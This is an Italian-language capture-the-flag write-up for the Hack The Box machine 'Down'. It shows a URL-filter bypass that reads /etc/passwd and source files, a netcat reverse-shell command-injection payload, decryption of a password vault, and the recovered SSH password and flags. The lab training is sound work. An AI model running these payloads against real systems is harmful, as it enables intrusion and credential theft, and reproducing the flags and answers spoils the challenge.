# 🧩 Down – CTF Hack The Box 

## Introduzione

In questa macchina ho affrontato una vulnerabilità LFI (Local File Inclusion) con filtro sui protocolli, ho ottenuto una reverse shell tramite command injection, e infine trovando la password per loggarmi ssh ho trovato la root flag. Ecco tutti i passaggi che ho seguito:

---

## 1️⃣ How many open TCP ports are listening on Down?

Ho eseguito una scansione Nmap per trovare le porte aperte:

nmap -sC -sS IP_TARGET

Dalla scansione risultano **2 porte TCP aperte**

---

## 2️⃣ What is the User Agent string used in HTTP requests made by the web application?

Ho avviato un listener sulla mia macchina:

nc -lvnp 8000


Poi ho inserito l’URL del mio listener nel form del sito (http://mio_ip_tun0:porta_nc), dalla connessione in ingresso successivamente ho visto che la User Agent era:

curl/7.81.0


---

## 3️⃣ The web application only accepts two protocols in user-provided URLs. One is HTTP. What is the other?

Testando con BurpSuite, ho provato a inviare URL con protocolli alternativi, ma la risposta del server è chiara: "Only protocols http or https allowed". Quindi è confermato che accetta solo HTTP e HTTPS, bloccando tutto il resto.

---

## 4️⃣ What is the username with id 1000 on Down?

Ho analizzato la richiesta POST a /index.php con BurpSuite. Il parametro url permette di inviare un link, che il backend tenta di raggiungere. Dopo diversi tentativi di bypass, come:

    file%3A%2F%2F%2Fetc%2Fpasswd → bloccato dal filtro

    http://test@file:///etc/passwd → filtrato

    http://127.0.0.1#file:///etc/passwd → interessante, perché il contenuto dopo # veniva visualizzato nella risposta

A questo punto ho provato a sfruttare un multi-URL injection con:

http://127.0.0.1%20file:///etc/passwd

E ha funzionato: sono riuscito a bypassare il filtro e il backend ha caricato correttamente il contenuto di /etc/passwd, da cui ho ricavato:

aleks:x:1000:1000:Aleks:/home/aleks:/bin/bash

Quindi lo username è: **Aleks**

---

## 5️⃣ What is the name of the HTTP GET parameter that changes the site's functionality?

Ho sfruttato la stessa tecnica per leggere il file `index.php`:

http://127.0.0.1%20file:///var/www/html/index.php


Nel codice PHP ho trovato questo parametro:

$_GET['expertmode']

Quindi il parametro è: expertmode

---

## 6️⃣ Submit the flag located in the www-data user's home directory. Exploit the expert mode application to get a shell.

Ho visitato la pagina:

http://10.129.232.247/index.php?expertmode=tcp


Nel frattempo ho aperto un listener Netcat:

nc -lvnp 4444


Poi ho manipolato la richiesta in BurpSuite, modificando i parametri ip e port fino a trovare il payload giusto:

ip=ip_mio_tun0&port=porta_nc+-e+/bin/bash


Questo mi ha dato una shell. Con whoami ho successivamente ottenuto: www-data

---

## 7️⃣ Submit the flag located in the www-data user's home directory.

Con la shell attiva, ho eseguito:

ls

index.php
logo.png
style.css
user_aeT1xa.txt


Ho letto il file con:

cat user_aeT1xa.txt

Ottenendo la user flag: d4bc94b386ef7c8113698a8c4951cacd

---

## 8️⃣ What is the full path of the file owned by aleks that contains encrypted passwords?

Navigando nella home di aleks, ho trovato:

/home/aleks/.local/share/pswm/pswm


---

## 9️⃣ What python module does pwsm use to encrypt/decrypt data?

Cercando il progetto pswm su GitHub ho scoperto che utilizza il modulo:
(fonte: https://github.com/Julynx/pswm/blob/main/pswm)

cryptocode


---

## 🔟 What is the aleks user's pwsm master password?

Ho scritto uno script in Python usando cryptocode per decriptare il file .pswm. Sono riuscito a recuperare:

- **Password:** flower
- **SSH Password:** 1uY3w22uc-Wr{xNHR~+E

---

## 🔐 Root Flag

Mi sono connesso via SSH con le credenziali trovate. Una volta ottenuto accesso come aleks, sono entrato come root e successivamente ho trovato la flag finale:

cat /root/root.txt
87bb9869a311b8abb5fb4d3c7248fdcb


## Conclusione

Una macchina davvero interessante. Il bypass del filtro protocolli tramite double URL e encoding è stato molto istruttivo. Ho messo in pratica tecniche web, reverse shell, decodifica, e privilege escalation. Ottimo allenamento completo da cima a fondo!

